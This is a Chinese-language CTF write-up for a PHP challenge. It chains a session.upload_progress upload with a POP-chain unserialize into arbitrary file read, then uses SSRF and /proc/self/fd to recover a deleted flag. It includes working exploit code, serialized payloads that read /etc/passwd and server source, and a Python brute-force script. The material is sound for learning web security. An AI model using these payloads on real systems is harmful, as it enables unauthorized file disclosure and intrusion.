### web7

查看代码

```php
 <?php
include("class.php");
error_reporting(0);
highlight_file(__FILE__);
ini_set("session.serialize_handler", "php");
session_start();

if (isset($_GET['phpinfo']))
{
    phpinfo();
}
if (isset($_GET['source']))
{
    highlight_file("class.php");
}

$happy=new Happy();
$happy();
?>
Happy_New_Year!!!
```

这串代码比较简单，查看class.php的代码和phpinfo()

class.php

```php
<?php
    class Happy {
        public $happy;
        function __construct(){
                $this->happy="Happy_New_Year!!!";

        }
        function __destruct(){
                $this->happy->happy;

        }
        public function __call($funName, $arguments){
                die($this->happy->$funName);
        }

        public function __set($key,$value)
        {
            $this->happy->$key = $value;
        }
        public function __invoke()
        {
            echo $this->happy;
        }


    }

    class _New_{
        public $daniu;
        public $robot;
        public $notrobot;
        private $_New_;
        function __construct(){
                $this->daniu="I'm daniu.";
                $this->robot="I'm robot.";
                $this->notrobot="I'm not a robot.";

        }
        public function __call($funName, $arguments){
                echo $this->daniu.$funName."not exists!!!";
        }

        public function __invoke()
        {
            echo $this->daniu;
            $this->daniu=$this->robot;
            echo $this->daniu;
        }
        public function __toString()
        {
            $robot=$this->robot;
            $this->daniu->$robot=$this->notrobot;
            return (string)$this->daniu;

        }
        public function __get($key){
               echo $this->daniu.$key."not exists!!!";
        }

 }
    class Year{
        public $zodiac;
         public function __invoke()
        {
            echo "happy ".$this->zodiac." year!";

        }
         function __construct(){
                $this->zodiac="Hu";
        }
        public function __toString()
        {
                $this->show();

        }
        public function __set($key,$value)#3
        {
            $this->$key = $value;
        }

        public function show(){
            die(file_get_contents($this->zodiac));
        }
        public function __wakeup()
        {
            $this->zodiac = 'hu';
        }

    }
?>
__invoke:当把对象当作函数时就会触发
__wakeup:当执行unserialize时就会触发
__call:当对象上下文调用不可调用的函数时触发
__get:从不可访问的属性读取数据时触发
```

看到`class.php`，我们的利用点是`file_get_contens`，通过这个函数来获取文件内容

这个php文件需要通过构造pop链来进行反序列化

回到index.php

```php
ini_set("session.serialize_handler", "php");
session_start()
```

显而易见，就是利用session反序列化

看phpinfo

![image-20220208123125368](https://img-blog.csdnimg.cn/img_convert/49606a746b8120579d384649ae288d53.png)



`session.upload_progress.enabled`为on，`session.upload_progress.cleanup`为off

所以，在index中没有可控的参数，我们就通过session.upload_progress，上传文件，来进行session反序列化。

这儿解释一下，`session.upload_progress.enabled`为`on`代表这，当我们从浏览器向服务器上传文件时，会将文件上传的详细信息(上传进度，上传内容等)存储在session中



构造pop链

```
Happy:__destruct()=>_New_:__get()=>_New_:__toString()=>Year:__toString()=>Year:Show()
```

所以exp为：

```php
<?php
    class Happy {
        public $happy;
    }

    class _New_{
        public $daniu;
        public $robot;
        public $notrobot;

 }
    class Year{
        public $zodiac;

    }

$a=new Happy();//创建Happy对象
$a->happy=new _New_();//当访问到Happy的destruct，就是new对象访问happy属性,触发new的get方法
$a->happy->daniu=new _New_();//把对象当作字符串，触发tostring方法
$a->happy->daniu->daniu=new Year();//$a->happy->daniu的daniu属性赋值
$a->happy->daniu->robot="zodiac";//给$zodiac赋值
$a->happy->daniu->notrobot="/etc/passwd";
//（string）转换，就是将对象当作字符串，触发year的tostring方法，然后到show方法。
echo serialize($a);

?>

```

pop链构造完成后，这个时候我们需要从浏览器向服务器上传文件。

因为`session.upload_progress.cleanup`为off，我们不需要条件竞争

直接构造上传表单

```php
<form action="http://1bd48b1f-459e-411c-adcf-81a7167b60d5.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
        <input type="hidden" name='PHP_SESSION_UPLOAD_PROGRESS' value="123" />
        <input type="file" name="file" />
        <input type="submit" />
</form>
```

然后抓包，将filename参数修改为：

得到的反序列化需要将双引号转义，然后再前面加个`|`（这是由session处理器session.serialize_handler决定的）

```
|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:11:\"/etc/passwd\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}
```

将序列化值上传到服务器，储存在session中，index中的session_start()触发了，构成一个`任意文件读取漏洞`。



在linux中，/proc/{pid}/cmdline所有用户都可以读取，查看cmdline目录获取启动指定进程的完整命令

直接上脚本爆破

```python
import requests
import time


def get_file(filename):
	data="""------WebKitFormBoundarytyYa582A3zCNLMeL
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
------WebKitFormBoundarytyYa582A3zCNLMeL
Content-Disposition: form-data; name="file"; filename="|O:5:\\"Happy\\":1:{s:5:\\"happy\\";O:5:\\"_New_\\":3:{s:5:\\"daniu\\";O:5:\\"_New_\\":3:{s:5:\\"daniu\\";O:4:\\"Year\\":1:{s:6:\\"zodiac\\";N;}s:5:\\"robot\\";s:6:\\"zodiac\\";s:8:\\"notrobot\\";s:"""+str(len(filename))+""":\\\""""+filename+"""\\";}s:5:\\"robot\\";N;s:8:\\"notrobot\\";N;}}\"
Content-Type: text/plain


------WebKitFormBoundarytyYa582A3zCNLMeL--"""
	r=requests.post(url='http://32c5b7fa-ed9f-46f9-9c1d-28d49508feb7.challenge.ctf.show/',data=data,headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundarytyYa582A3zCNLMeL','Cookie': 'PHPSESSID=917571d70a5c49843a1625b52880d774'})
	return(r.text.encode()[1990:])#去掉源码信息，encode是为了能显示\00

for i in range(999):
	print(i)
	print(get_file('/proc/'+str(i)+'/cmdline'))
	time.sleep(0.2)

```

查看到114进程有一个命令，`python3 /app/server.py`，读取内容`/app/server.py`

```
|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:14:\"/app/server.py\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}
```

获取源码：

```python
from flask import *
import os

app = Flask(__name__)
flag=open('/flag','r')
#flag我删了
os.remove('/flag')

@app.route('/', methods=['GET', 'POST'])
def index():
	return "flag我删了，你们别找了"

@app.route('/download/', methods=['GET', 'POST'])
def download_file():
    return send_file(request.args['filename'])


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)

```

`os.remove('/flag')`得知flag删除了，我们可以使用/proc/self/fd/{数字}，来获取删除的内容。

看到`/download/`中`send_file`可以获取本地服务器的内容。

所以可以构造

其中3是尝试出来的

```
shttp://127.0.0.1:5000/download/?filename=/proc/self/fd/3
```

payload

```
|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";s:56:\"http://127.0.0.1:5000/download/?filename=/proc/self/fd/3\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}s:5:\"robot\";N;s:8:\"notrobot\";N;}}
```

